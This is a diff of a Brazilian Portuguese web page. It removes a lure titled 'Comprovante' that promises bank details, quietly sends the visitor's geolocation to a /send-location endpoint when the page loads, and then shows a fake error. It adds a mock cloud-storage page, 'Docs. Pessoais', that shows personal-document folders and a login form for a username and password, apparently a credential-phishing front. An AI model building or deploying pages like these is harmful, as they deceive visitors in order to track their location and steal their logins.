@@ -1,50 +1,111 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-BR" >
 <head>
   <meta charset="UTF-8">
-  <title>Comprovante</title>
+  <title>Docs. Pessoais</title>
+  <link rel="icon" type="image/svg+xml" href="icon/favicon.svg">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Lato:100,300,400,700,900|Open+Sans:300,400,600,700,800|Source+Sans+Pro:200,300,400,600,700,900'>
+  <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'>
+  <link rel="stylesheet" href="css/style.css">
 </head>
-<body style="background-color: antiquewhite;">
-  <h1>Dados bancários:</h1>
-  <p>Libere as permissões do navegador para visualizar</p>
-  <script>
-    // Executa automaticamente ao carregar a página
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
-    });
+<body>
+<div class="user-data-area" clear>
+	<div class="cloud-server-name">Qbus Nuvem</div>
+	<div class="login-cloud" modal-click="login">Entrar</div>
+	<div class="cloud-server-user"><i class="fas fa-user"></i><span class="user-option">Alencar Araujo<ul class="option">
+		<li>Usuário</li>
+		<li>Configuração</li>
+		<li>Sair</li>
+		</ul></span></div>
+</div>
+<div class="cm-address-bar-search" clear>
+	<div class="address-search">
+		<div class="pos"><input type="text" class="address-search-input"><div class="cm-button address-button"><i class="fas fa-arrow-right"></i></div><div class="address-short-btn"></div></div>
+	</div>
+	<div class="search-file-and-folder">
+		<div class="pos"><input placeholder="Buscar.." type="text" class="files-search-input"><div class="cm-button file-search-button"><i class="fas fa-search"></i></div></div>
+	</div>
+	<div class="uploads-folder-files">
+		<div class="upload-btn-wrapper">
+			<button class="upload" modal-click="upload-form"><i class="fas fa-circle-notch"></i><i class="fas fa-cloud-upload-alt"></i>Enviar</button>
+		</div>
+	</div>
+</div>
+<div class="cloud-manager">
+	<ul>
+		<li data-type="project">Nome do Projeto
+			<ul>
+				<li data-type="cloud">Nuvem
+					<ul>
+						<li data-type="folder">CNH</li>
+						<li data-type="folder">Comprovante de Residência</li>
+						<li data-type="folder">Fotos
+							<ul>
+								<li data-type="folder">Pasta 3-1</li>
+								<li data-type="folder">Pasta 3-2
+									<ul>
+										<li data-type="html">index.html</li>
+										<li data-type="js">index.js</li>
+										<li data-type="css">style.css</li>
+										<li data-type="image">suryansh.jpg</li>
+									</ul>
+								</li>
+								<li data-type="folder">Pasta 3-3</li>
+								<li data-type="folder">Pasta 3-4
+									<ul>
+										<li data-type="html">index.html</li>
+										<li data-type="js">index.js</li>
+										<li data-type="css">style.css</li>
+										<li data-type="folder">Vazio</li>
+									</ul>
+								</li>
+							</ul>
+						</li>
+						<li data-type="folder">Pasta 2-4</li>
+					</ul>
+				</li>
+			</ul>
+		</li>
+	</ul>
+</div>
 
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-
-      // Envia a localização para o backend
-      fetch("/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.success) {
-          alert("Algo deu errado. Tente novamente mais tarde.");
-        } else {
-          alert("Algo deu errado. Tente novamente mais tarde.");
-        }
-      })
-      .catch(error => {
-        console.error("Erro:", error);
-      });
-    }
-
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
-    }
-  </script>
+<div class="modals-overlay"></div>
+<div class="cm-model-wrapper">
+<div class="cm-project-modal" modal-data="login">
+	<div class="cm-project-modal-header">
+		<label>Entrar na Nuvem</label>
+	</div>
+	<div class="cm-project-setting-inner-wrapper">
+		<div class="cm-form-wrapper">
+			<label>Email ou Nome de Usuário<i>*</i></label>
+			<input type="text" name="username">
+		</div>
+		<div class="cm-form-wrapper">
+			<label>Senha<i>*</i></label>
+			<input type="password" name="password">
+		</div>
+		<div class="cm-form-wrapper">
+			<label>Tipo de Armazenamento<i>*</i></label>
+			<select name="menu-type">
+				<option>Selecione</option>
+				<option>Nuvem</option>
+				<option>FTP</option>
+				<option>Armazenamento em Rede</option>
+			</select>
+		</div>
+	</div>
+	<div class="cm-project-modal-footer">
+		<div><span class="disclaimer">* Importante preencher</span></div>
+		<div class="form-action-box">
+			<button class="data-scan-directory btn-def">Escanear Diretório</button>
+			<button class="data-file-save btn-def" model-close>Salvar</button>
+		</div>
+	</div>
+</div>
+</div>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
+<script src='https://use.fontawesome.com/releases/v5.0.6/js/all.js'></script>
+<script src="js/script.js"></script>
 </body>
 </html>
